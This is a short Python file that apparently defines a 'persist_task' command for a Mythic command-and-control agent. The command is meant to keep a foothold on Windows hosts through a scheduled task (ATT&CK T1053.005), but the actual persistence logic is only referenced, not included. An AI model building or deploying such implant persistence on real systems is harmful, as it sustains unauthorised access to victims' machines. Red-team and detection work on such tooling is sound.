from mythic_container import MythicCommandBase, MythicTask
from mythic_container import TaskArguments


class PersistTaskArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class PersistTaskCommand(MythicCommandBase):
    cmd = "persist_task"
    needs_admin = False
    help_cmd = "persist_task"
    description = "Establish persistence via Windows scheduled task"
    version = 1
    author = "@phantom"
    argument_class = PersistTaskArguments
    attackmapping = ["T1053.005"]

    async def create_go_tasking(self, taskData: MythicTask) -> str:
        return "PersistenceHandler.CreateScheduledTaskPersistence()"

    async def process_response(self, task: MythicTask, response: any) -> str:
        return f"Scheduled task persistence: {response}"